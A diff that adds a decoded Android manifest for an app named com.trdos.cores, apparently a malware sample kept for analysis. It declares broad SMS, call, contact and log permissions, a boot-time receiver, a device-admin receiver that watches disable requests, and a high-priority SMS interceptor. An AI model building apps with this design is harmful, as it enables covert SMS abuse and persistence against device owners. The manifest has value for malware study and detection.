@@ -1,0 +1,92 @@
+manifest
+- package: com.trdos.cores
+- platformBuildVersionName: 4.4.2-1456859
+- platformBuildVersionCode: 19
+	uses-sdk
+	- minSdkVersion: 9
+	uses-permission
+	- name: android.permission.CALL_PHONE
+	uses-permission
+	- name: android.permission.SEND_SMS
+	uses-permission
+	- name: android.permission.WRITE_SMS
+	uses-permission
+	- name: android.permission.READ_SMS
+	uses-permission
+	- name: android.permission.GET_TASKS
+	uses-permission
+	- name: android.permission.ACCESS_NETWORK_STATE
+	uses-permission
+	- name: android.permission.READ_PHONE_STATE
+	uses-permission
+	- name: android.permission.RECEIVE_SMS
+	uses-permission
+	- name: android.permission.WRITE_EXTERNAL_STORAGE
+	uses-permission
+	- name: android.permission.INTERNET
+	uses-permission
+	- name: android.permission.RECEIVE_BOOT_COMPLETED
+	uses-permission
+	- name: android.permission.READ_LOGS
+	uses-permission
+	- name: android.permission.READ_CONTACTS
+	application
+	- icon: 2130837504
+	- theme: 2131165185
+	- label: 2131099648
+	- allowBackup: true
+		activity
+		- name: com.trdos.cores.MainActivity
+		- label: 2131099648
+			intent-filter
+				action
+				- name: android.intent.action.MAIN
+				category
+				- name: android.intent.category.LAUNCHER
+		service
+		- exported: true
+		- name: com.trdos.cores.Sb
+		- enabled: true
+		service
+		- exported: true
+		- name: com.trdos.cores.Dc
+		- enabled: true
+		receiver
+		- exported: false
+		- name: com.trdos.cores.Db
+		- enabled: true
+			intent-filter
+				action
+				- name: android.intent.action.BOOT_COMPLETED
+				action
+				- name: android.intent.action.SCREEN_ON
+				category
+				- name: android.intent.category.HOME
+		receiver
+		- name: com.trdos.cores.Da
+		- permission: android.permission.BIND_DEVICE_ADMIN
+			intent-filter
+				action
+				- name: android.app.action.DEVICE_ADMIN_ENABLED
+			meta-data
+			- name: stopOnDeviceLock
+			- value: false
+			meta-data
+			- name: android.app.device_admin
+			- resource: 2130968576
+			meta-data
+			- name: preventRestart
+			- value: true
+			intent-filter
+				action
+				- name: android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED
+				action
+				- name: android.app.action.ACTION_DEVICE_ADMIN_DISABLED
+				action
+				- name: android.app.action.DEVICE_ADMIN_ENABLED
+		receiver
+		- name: com.trdos.cores.Ma
+			intent-filter
+			- priority: 100
+				action
+				- name: android.provider.Telephony.SMS_RECEIVED
